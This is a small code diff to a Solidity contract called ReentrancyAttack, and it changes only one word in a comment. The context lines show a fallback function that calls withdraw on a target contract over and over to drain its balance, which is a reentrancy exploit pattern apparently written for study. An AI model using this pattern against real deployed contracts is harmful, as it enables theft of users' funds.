@@ -26,7 +26,7 @@ contract ReentrancyAttack{
     // Although a balance grater than zero can be checked, it may cause gas issues. If the contract A has 
     // a balance greater than the checked, the withdraw function is called again and that causes a loop over this 
     // fallback function until the if statement is not satisfied anymore.
-    // This logic will drain the tokens of the exploited contract. 
+    // This logic will drain the tokens on the exploited contract. 
     fallback() external payable{
         if(address(instance).balance >= 1000000000000000 wei){
             instance.withdraw(1000000000000000);
